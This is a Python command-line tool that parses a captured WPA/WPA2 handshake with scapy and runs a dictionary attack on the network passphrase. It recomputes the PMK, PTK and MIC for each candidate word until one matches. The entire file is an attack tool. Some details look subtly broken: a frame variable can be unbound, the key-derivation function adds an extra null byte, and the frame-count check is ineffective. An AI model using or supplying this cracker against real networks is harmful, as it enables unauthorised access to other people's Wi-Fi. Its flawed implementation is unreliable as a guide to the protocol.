from scapy.all import Dot11, rdpcap, EAPOL
from hashlib import pbkdf2_hmac
from sys import argv
import hmac
import sys

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WCrack:
    def __init__(self, wodllist, ssid, bssid, filename,
                 versicon=2, mic_number=3):
        self.versicon = versicon
        self.filename = filename
        self.bssid = bssid
        self.ssid = ssid
        self.wodllist = wodllist
        self.mic_number = mic_number
        self.hash = "sha1" if versicon == 2 else "md5"

        self.eapol = []
        self.ANONCE = None
        self.SNONCE = None
        self.mic = None
        self.mac_station = None
        self.eapol_zero_mic = None

    def _eapol(self):
        packets = rdpcap(self.filename)
        eapol_1 = eapol_2 = eapol_3 = None
        for packet in packets:
            if packet.haslayer(Dot11) and packet.haslayer(EAPOL):
                if packet[EAPOL].type == 3:
                    if packet[EAPOL].has_key_mic == 0: eapol_1 = packet
                    else:
                        if packet[EAPOL].encrypted_key_data == 1:  eapol_2 = packet
                        elif packet[EAPOL].key_nonce == (32 * b'\00'): eapol_3 = packet
                        else: eapol_4 = packet
        self.eapol.append(eapol_1) ; self.eapol.append(eapol_2) ; self.eapol.append(eapol_3) ; self.eapol.append(eapol_4)
        print(f"[*] Found {len(self.eapol)} EAPOL-Key frames")

    def _mac_to_int(self, mac):
        return int(mac.replace(":", "").replace("-", ""), 16)

    def _getmac(self):
        ap = bytes.fromhex(self.bssid.replace(":", ""))
        sta = bytes.fromhex(self.mac_station.replace(":", ""))
        if sta < ap:
            return sta, ap
        return ap, sta

    def _prf512(self, key, data):
        result = b''
        for i in range(4):
            result += hmac.new(key, data + bytes([i]) + b'\x00', self.hash).digest()
        return result[:64]

    def set(self):
        self._eapol()

        if len(self.eapol) < max(self.mic_number, 2):
            print(f"[!] Not enough EAPOL frames: {len(self.eapol)}")
            sys.exit(1)

        frame = self.eapol[self.mic_number - 1]
        self.eapol_zero_mic = frame[EAPOL].copy()
        self.eapol_zero_mic.key_mic = b'\x00' * 16

        self.ANONCE = self.eapol[0][EAPOL].key_nonce
        self.SNONCE = self.eapol[1][EAPOL].key_nonce

        self.mic = frame[EAPOL].key_mic

        self.mac_station = frame.addr2 if frame.addr2 != self.bssid else frame.addr1

        print(f"[*] BSSID:      {self.bssid}")
        print(f"[*] STA:        {self.mac_station}")
        print(f"[*] ANonce:     {self.ANONCE.hex()}")
        print(f"[*] SNonce:     {self.SNONCE.hex()}")
        print(f"[*] MIC:        {self.mic.hex()}")

    def Cracker(self, passwords):
        colors = Colors()
        mac_min, mac_max = self._getmac()

        if self.ANONCE < self.SNONCE:
            nonce_min, nonce_max = self.ANONCE, self.SNONCE
        else:
            nonce_min, nonce_max = self.SNONCE, self.ANONCE

        label = b"Pairwise Key expansion\x00"
        data = mac_min + mac_max + nonce_min + nonce_max

        eapol_bytes = bytes(self.eapol_zero_mic)

        count = 0
        for password in passwords:
            password = password.strip('\n').strip('\r')
            if not password:
                continue
            count += 1
            print(f"\r{colors.BLUE}Trying: {password}{colors.ENDC}", end='', flush=True)

            PMK = pbkdf2_hmac(self.hash, password.encode(), self.ssid.encode(), 4096, 32)
            PTK = self._prf512(PMK, label + data)
            calcu_mic = hmac.new(PTK[:16], eapol_bytes, self.hash).digest()

            if calcu_mic == self.mic:
                print()
                print(colors.FAIL + "*" * 80)
                print(colors.GREEN + f"Found Password: {password}")
                print(colors.FAIL + "*" * 80)
                return password

        print(f"\n{colors.WARNING}[!] Tried {count} passwords, none matched.{colors.ENDC}")
        return None

    def start(self):
        self.set()
        with open(self.wodllist, 'r', encoding='utf-8', errors='ignore') as passwords:
            self.Cracker(passwords)


def run_py():
    argv = sys.argv 
    bssid = argv[1]
    ssid = argv[2]
    filename = argv[3]
    wodllist = argv[4]
    WCrack(
        wodllist=wodllist,
        ssid=ssid,
        bssid=bssid,
        filename=filename,

    ).start()        
    return 

if __name__ == "__main__":
    run_py()
